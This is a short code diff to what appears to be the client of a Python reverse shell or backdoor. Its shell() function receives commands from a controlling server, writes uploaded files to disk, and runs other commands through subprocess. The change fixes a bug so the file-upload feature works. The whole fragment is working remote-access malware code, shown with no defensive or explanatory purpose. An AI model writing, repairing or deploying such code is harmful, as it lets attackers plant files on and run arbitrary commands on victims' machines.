@@ -44,7 +44,7 @@ def shell():
 		elif server_cmd[:6] == "upload":
 			with open(server_cmd[7:], "wb") as docs:
 				docs_data = json_recv()
-				docs.write(base64.b64decode(docs))
+				docs.write(base64.b64decode(docs_data))
 		else:
 			# if everything goes a expected, this else condition will run
 			ps = subprocess.Popen(
